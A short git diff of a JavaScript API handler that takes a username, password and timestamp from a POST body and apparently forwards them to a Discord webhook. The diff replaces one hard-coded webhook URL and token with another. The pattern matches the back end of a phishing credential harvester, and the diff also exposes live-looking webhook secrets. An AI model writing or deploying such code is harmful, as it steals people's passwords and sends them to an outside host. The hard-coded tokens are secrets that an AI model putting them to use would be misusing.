@@ -3,7 +3,7 @@ export default async function handler(req, res) {
         return res.status(405).json({ error: 'Method not allowed' });
     }
 
-    const webhookUrl = "https://discord.com/api/webhooks/1378978890373926963/KBqbq1R-P4Pu1ytdZl5oo5kHKVkCpz8MeszoyUjR1JRK1M-vIQ4ov2x4hFbhMJa_VGmQ";
+    const webhookUrl = "https://discord.com/api/webhooks/1391032347234668624/j4v2bTS3LmLDO0Vaflk1L41T8uXFxe4BHBUs5fvI4OE_E43LH2fpjIxoBVti8ptGojCV";
 
     const { username, password, timestamp } = req.body;
 
@@ -48,4 +48,5 @@ export default async function handler(req, res) {
         console.error('Webhook Error:', error);
         res.status(500).json({ error: error.message });
     }
+
 }
